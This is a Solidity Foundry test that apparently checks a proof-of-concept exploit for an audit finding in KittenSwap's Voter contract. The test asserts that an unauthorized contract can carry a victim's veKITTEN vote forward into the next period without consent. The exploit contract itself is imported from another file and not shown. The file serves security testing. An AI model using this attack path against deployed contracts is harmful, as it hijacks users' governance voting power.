// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {Exploit, Voter, VeKitten, MarkerToken, SINK} from "./61953-h-03-permissionless-voting-through-votercarryvoteforward-pas.sol";

contract KittenSwapCarryVoteForwardTest is Test {
    function test_permissionlessCarryVoteForward() public {
        Exploit e = new Exploit();

        Voter voter = e.voter();
        VeKitten veKitten = e.veKitten();
        MarkerToken marker = e.marker();

        uint256 tokenId = e.TOKEN_ID();
        uint256 weight = e.VOTE_WEIGHT();
        address pool = e.POOL();
        uint256 nextPeriod = e.FROM_PERIOD() + 1;

        // the Exploit contract is not owner/approved for the veKITTEN
        assertFalse(veKitten.isApprovedOrOwner(address(e), tokenId), "attacker must be unauthorized");

        // run the permissionless carry-forward attack; asserts the harm internally
        e.run();

        // the victim's full voting power was re-cast for the next period without consent
        assertEq(voter.poolWeight(nextPeriod, pool), weight, "unauthorized vote not carried forward");
        assertEq(e.carriedWeight(), weight, "carried weight mismatch");

        // harm magnitude recorded at the SINK
        assertEq(marker.balanceOf(SINK), weight, "harm not recorded at sink");
        assertGt(marker.balanceOf(SINK), 0, "no harm");
    }
}
